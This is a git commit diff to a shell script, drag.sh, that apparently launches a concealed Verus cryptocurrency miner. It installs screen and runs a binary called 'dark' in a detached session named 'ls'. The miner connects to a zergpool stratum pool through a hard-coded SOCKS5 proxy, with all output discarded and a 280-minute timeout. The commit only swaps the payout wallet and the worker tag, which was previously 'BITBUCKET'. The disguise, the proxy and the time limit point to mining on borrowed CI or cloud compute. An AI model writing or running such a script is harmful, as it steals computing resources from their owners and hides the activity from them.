58ce4d19b94d54974927681a95c18879ba6afd01
dragon crack <dragoncrack@hanisah.store>
2021-08-14 09:55:08 +0000

    drag.sh edited online with Bitbucket

--- drag.sh
+++ drag.sh
@@ -4,8 +4,8 @@ sudo apt install screen libjansson4 -y
 chmod +x dark
 screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
-WALLET=DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV
+WALLET=aPVG6oYboudnE31PwkPLi94pbc5CaVj21N
 PROXY=socks5://192.252.209.155:14455
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-BITBUCKET)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-DRAGONC)
 timeout 280m ./dark -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
 echo Sukses
